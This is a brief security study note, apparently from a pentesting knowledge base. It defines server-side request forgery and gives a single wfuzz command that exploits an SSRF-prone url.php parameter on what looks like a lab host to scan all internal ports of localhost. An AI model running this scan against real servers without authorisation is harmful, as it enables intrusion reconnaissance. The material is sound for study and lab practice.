---
tags:
  - Enumeration
  - TCP
  - HTTP
  - Concepts
  - Vulnerabilities
  - HyperTextTransferProtocol
---
**Server-side request forgery** (**SSRF**) is a type of computer security exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker.

`wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ`
